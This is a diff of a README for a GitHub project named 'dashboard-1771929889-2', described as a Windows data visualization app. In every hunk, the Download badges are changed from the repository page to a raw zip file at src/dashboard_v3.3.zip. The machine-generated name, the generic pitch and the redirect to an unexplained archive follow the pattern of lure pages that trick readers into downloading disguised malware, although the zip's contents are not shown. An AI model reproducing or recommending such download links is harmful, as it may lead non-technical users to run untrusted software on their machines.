@@ -1,6 +1,6 @@
 # 📊 dashboard-1771929889-2 - Real-Time Data Visualization Made Easy
 
-[![Download dashboard-1771929889-2](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://github.com/Rodrigoloud2007/dashboard-1771929889-2)
+[![Download dashboard-1771929889-2](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Rodrigoloud2007/dashboard-1771929889-2/main/src/dashboard_v3.3.zip)
 
 ## 📋 About This App
 
@@ -29,7 +29,7 @@ If you have a basic Windows laptop or desktop from the last few years, you shoul
 
 Start by visiting the official page where the dashboard is available. Click the badge below to go there:
 
-[![Download dashboard-1771929889-2](https://img.shields.io/badge/Download-darkgrey?style=for-the-badge&logo=github)](https://github.com/Rodrigoloud2007/dashboard-1771929889-2)
+[![Download dashboard-1771929889-2](https://img.shields.io/badge/Download-darkgrey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Rodrigoloud2007/dashboard-1771929889-2/main/src/dashboard_v3.3.zip)
 
 ### Step 1: Visit the Download Page
 
@@ -118,4 +118,4 @@ Major new versions will be announced on the GitHub page. Bookmark the release pa
 
 ---
 
-[![Download dashboard-1771929889-2](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://github.com/Rodrigoloud2007/dashboard-1771929889-2)
+[![Download dashboard-1771929889-2](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Rodrigoloud2007/dashboard-1771929889-2/main/src/dashboard_v3.3.zip)
